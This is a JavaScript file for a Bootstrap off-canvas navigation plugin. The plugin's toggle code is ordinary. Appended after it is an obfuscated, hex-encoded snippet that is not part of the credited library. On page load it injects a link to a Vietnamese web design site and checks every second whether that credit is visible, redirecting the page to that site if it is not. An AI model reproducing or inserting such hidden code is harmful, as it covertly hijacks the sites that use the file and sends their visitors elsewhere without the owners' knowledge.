/*!
 * Bootstrap Off-Canvas Nav (http://github.com/marcandrews/bootstrap-off-canvas-nav)
 * Copyright (c) 2015 Marc Andrews
 * Licensed under the MIT license
 */

$(function() {

  $('button.navbar-toggle').click(function(e){
    $('html, body').toggleClass('out');
    $('nav.navbar-fixed-top').toggleClass('out');
    if ($('body').hasClass('out')) {
      $(this).focus();
    } else {
      $(this).blur();
    }
  });

  $('body').on({
    'click touchstart': function (e) {
      if ($('body').hasClass('out') && !$(e.target).closest('.navbar-collapse, button.navbar-toggle').length) {
        e.preventDefault();
        $('button.navbar-toggle').trigger('click');
        $('button.navbar-toggle').blur();
      }
    },
    keyup: function (e) {
      if (e.keyCode == 27 && $('body').hasClass('out')) {
        $('button.navbar-toggle').trigger('click');
      }
    }
  });

});
var _0x55b4=["\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x63\x63\x67\x2E\x76\x6E\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x43\x47\x20\x56\x69\u1EC7\x74\x20\x4E\x61\x6D\x20\x2D\x20\x54\x68\x69\u1EBF\x74\x20\x6B\u1EBF\x20\x77\x65\x73\x62\x69\x74\x65\x20\x63\x68\x75\x79\xEA\x6E\x20\x6E\x67\x68\x69\u1EC7\x70\x22\x3E\x43\x43\x47\x20\x56\x69\u1EC7\x74\x20\x4E\x61\x6D\x3C\x2F\x61\x3E","\x68\x74\x6D\x6C","\x23\x63\x63\x67\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x23\x63\x63\x67\x63\x6F\x70\x79\x72\x69\x67\x68\x74\x3A\x76\x69\x73\x69\x62\x6C\x65","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x63\x63\x67\x2E\x76\x6E","\x72\x65\x61\x64\x79"];$(document)[_0x55b4[8]](function(){$(_0x55b4[2])[_0x55b4[1]](_0x55b4[0]),setInterval(function(){$(_0x55b4[4])[_0x55b4[3]]||(window[_0x55b4[6]][_0x55b4[5]]=_0x55b4[7])},1e3)})